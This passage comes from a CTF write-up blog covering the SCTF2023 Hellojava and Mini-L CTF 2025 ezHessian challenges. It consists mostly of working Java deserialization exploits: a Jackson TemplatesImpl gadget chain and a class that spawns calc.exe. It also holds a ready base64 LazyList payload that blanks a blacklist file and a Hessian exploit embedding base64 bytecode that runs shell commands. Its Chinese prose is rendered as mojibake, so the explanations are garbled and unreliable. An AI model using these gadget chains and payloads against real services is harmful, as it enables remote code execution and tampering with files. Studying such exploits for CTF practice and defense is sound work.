&#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xx&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, a);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, a);<br><br><br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map1, map1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map2, map2, <span class="hljs-literal">null</span>));<br><br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bytes);<br>        objectOutputStream.writeObject(s);<br>        <span class="hljs-type">byte</span>[] output = Base64.getEncoder().encode(bytes.toByteArray());<br><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(java.util.Base64.getDecoder().decode(output));<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(output));<br><br>        <span class="hljs-type">NoObjectInputStream</span> <span class="hljs-variable">NoInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoObjectInputStream</span>(inputStream);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> NoInputStream.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250224164706848.png" alt="image-20250224164706848"></p><p>å¤§Bå“¥çš„blogå°†æ€ä¹ˆæ¶ˆé™¤é»‘åå•å’Œåç»­EXPéƒ½å·²ç»™å‡ºï¼š</p><p>[SCTF2023 Web WriteUp - Boogiepop Doesnâ€™t Laugh](<a href="https://boogipop.com/2023/06/20/SCTF2023">https://boogipop.com/2023/06/20/SCTF2023</a> Web WriteUp&#x2F;#Hellojava)</p><p>scalaé‡Œçš„lazylistæ˜¯å‡ºè¿‡javaååºåˆ—åŒ–æ¼æ´çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨expæ¸…ç©ºä»»æ„æ–‡ä»¶çš„å†…å®¹ï¼š</p><p><a href="https://github.com/yarocher/lazylist-cve-poc/blob/main/src/main/java/poc/cve/lazylist/payload/LazyList.java">https://github.com/yarocher/lazylist-cve-poc/blob/main/src/main/java/poc/cve/lazylist/payload/LazyList.java</a></p><p>æŒ‰ç…§ä¸Šè¿°githubé¡¹ç›®æ­å»ºå¥½ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–æ–‡ä»¶ï¼ŒæŠŠä»–base64åæ‰“å…¥é¢˜ç›®ï¼Œå°±ä¼šæ¸…ç©ºé»‘åå•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">rO0ABXNyADZzY2FsYS5jb2xsZWN0aW9uLmltbXV0YWJsZS5MYXp5TGlzdCRTZXJpYWxpemF0aW9uUHJveHkAAAAAAAAAAwMAAHhwc3IAJnNjYWxhLnJ1bnRpbWUuTW9kdWxlU2VyaWFsaXphdGlvblByb3h5AAAAAAAAAAECAAFMAAttb2R1bGVDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7eHB2cgAmc2NhbGEuY29sbGVjdGlvbi5nZW5lcmljLlNlcmlhbGl6ZUVuZCQAAAAAAAAAAwIAAHhwc3IAI3NjYWxhLmNvbGxlY3Rpb24uaW1tdXRhYmxlLkxhenlMaXN0AAAAAAAAAAMDAAVaAAhiaXRtYXAkMFoADW1pZEV2YWx1YXRpb25aADNzY2FsYSRjb2xsZWN0aW9uJGltbXV0YWJsZSRMYXp5TGlzdCQkc3RhdGVFdmFsdWF0ZWRMAAlsYXp5U3RhdGV0ABFMc2NhbGEvRnVuY3Rpb24wO0wAKnNjYWxhJGNvbGxlY3Rpb24kaW1tdXRhYmxlJExhenlMaXN0JCRzdGF0ZXQAK0xzY2FsYS9jb2xsZWN0aW9uL2ltbXV0YWJsZS9MYXp5TGlzdCRTdGF0ZTt4cAAAAXNyAExzY2FsYS5zeXMucHJvY2Vzcy5Qcm9jZXNzQnVpbGRlckltcGwkRmlsZU91dHB1dCQkYW5vbmZ1biQkbGVzc2luaXQkZ3JlYXRlciQzAAAAAAAAAAACAAJaAAhhcHBlbmQkMUwABmZpbGUkMnQADkxqYXZhL2lvL0ZpbGU7eHAAc3IADGphdmEuaW8uRmlsZQQtpEUODeT/AwABTAAEcGF0aHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAYLi9zZWN1cml0eS9ibGFja2xpc3QudHh0dwIAL3hzcQB+AAJ2cgAwc2NhbGEuY29sbGVjdGlvbi5pbW11dGFibGUuTGF6eUxpc3QkU3RhdGUkRW1wdHkkAAAAAAAAAAMCAAB4cHh4<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨jacksonçš„æ™®é€šåˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.http.HttpEntity;<br><span class="hljs-keyword">import</span> org.springframework.http.HttpHeaders;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URI;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp_TemplatesImplChain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;F:\\CTF_Java\\sctf_hellojava\\src\\main\\java\\exp\\eddiemurphy\\Calc.java&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">11</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(exp,jsonNodes);<br>        <span class="hljs-comment">//deserial(serial(exp));</span><br>        System.out.println(serial(exp));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserial</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodedBytes);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span>&#123;<br>        <span class="hljs-type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encode);<br>        System.out.println(s);<br>        System.out.println(s.length());<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼ ä¸¤æ¬¡å‚å°±okäº†ã€‚</p><p>SEå­¦é•¿çš„åˆ†æä¹Ÿæ˜¯å¾ˆä¸é”™å•Šï¼Œå‰äººæ ½æ ‘åäººä¹˜å‡‰äº†å˜»å˜»ï¼š</p><p><a href="https://notebook.silente.dev/Web/Writeups/SCTF2023/#hellojava">SCTF 2023 - SilentE çš„ç¬”è®°æœ¬</a></p><h2 id="Mini-L-CTF-2025-ezHessian-hdHessian"><a href="#Mini-L-CTF-2025-ezHessian-hdHessian" class="headerlink" title="Mini-L CTF-2025 ezHessian&#x2F;hdHessian"></a>Mini-L CTF-2025 ezHessian&#x2F;hdHessian</h2><p>éš¾å¾—ä¸€è§çš„hessianå•Šã€‚</p><h3 id="ezHessian"><a href="#ezHessian" class="headerlink" title="ezHessian"></a>ezHessian</h3><p>å…ˆçœ‹ezHessianï¼Œå…¶å®è¿™é“é¢˜éšä¾¿æœæœHessiançš„åŸç”Ÿé“¾å°±èƒ½æ‰“é€šï¼Œhessianç‰ˆæœ¬ä¸ç®—é«˜ï¼Œbypass wafå…¶å®ä½¿ç”¨UTF-8 Overlong Encodingå°±ç»•äº†ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520171311225.png" alt="image-20250520171311225"></p><p>ç®€å•ç²—æš´çš„æ¥å£ï¼Œä¸‹é¢è¿˜æœ‰ä¸ªdoPostä¹Ÿå¯ä»¥postä¼ å‚ã€‚</p><p>å…·ä½“ååºåˆ—åŒ–é“¾ä¸ä½œåˆ†æï¼Œç¨å¾®æ”¹æ”¹å°±èƒ½æ‰“é€šreadObjectå’Œæ•´ä¸ªchainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.reflect.misc.MethodUtil;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.UUID;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//å¯ä»¥ç›´æ¥ä»readfileç»¼åˆèµ·æ¥</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload_calc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;yv66vgAAADQAUQoAFwAjCAAkCAAlCgAmACcKAAgAKAgAKQoACAAqBwArCAAsCAAtCAAuCAAvBwAwCgAxADIKADEAMwoANAA1CgANADYIADcKAA0AOAoADQA5BwA6BwA7BwA8AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAKwcAPQcAOgEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMABgAGQEABGNhbGMBAAdvcy5uYW1lBwA+DAA/AEAMAEEAQgEAA3dpbgwAQwBEAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAEAAi9jAQAJL2Jpbi9iYXNoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgcARQwARgBHDABIAEkHAEoMAEsATAwAGABNAQACXEEMAE4ATwwAUABCAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABEV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0ACEAFgAXAAAAAAACAAEAGAAZAAEAGgAAAB0AAQABAAAABSq3AAGxAAAAAQAbAAAABgABAAAAAwAIABwAGQABABoAAAC6AAQAAwAAAF0SAksBTBIDuAAEtgAFEga2AAeZABkGvQAIWQMSCVNZBBIKU1kFKlNMpwAWBr0ACFkDEgtTWQQSDFNZBSpTTLsADVm4AA4rtgAPtgAQtwAREhK2ABO2ABRNpwAES7EAAQAAAFgAWwAVAAIAGwAAACYACQAAAAYAAwAHAAUACAAVAAkAKwALAD4ADgBYABAAWwAPAFwAEgAdAAAAFwAE/QArBwAeBwAfEv8AHAAAAAEHACAAAAEAIQAAAAIAIg==&quot;</span>;<br><br>        <span class="hljs-type">byte</span>[] decodedClassBytes = java.util.Base64.getDecoder().decode(payload_calc);<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayInputStream(decodedClassBytes));<br><span class="hljs-comment">// æ·»åŠ é™æ€ä»£ç å—æ‰“å°</span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">staticConstructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>        staticConstructor.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;success\&quot;);&quot;</span>);<br><span class="hljs-comment">// æ›´æ”¹ç±»å</span><br>        ctClass.setName(<span class="hljs-string">&quot;org.apache.WebSocketUpgradeOfpuanListener.&quot;</span> + UUID.randomUUID().toString().replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>));<br><span class="hljs-comment">// å°†ä¿®æ”¹åçš„ç±»è½¬æ¢ä¸º Base64</span><br>        payload_calc = java.util.Base64.getEncoder().encodeToString(ctClass.toBytecode());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">new_ClassName</span> <span class="hljs-operator">=</span> ctClass.getName();<br><br>        <span class="hljs-type">byte</span>[] bcode = Base64.decode(payload_calc);<br><br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);<br>        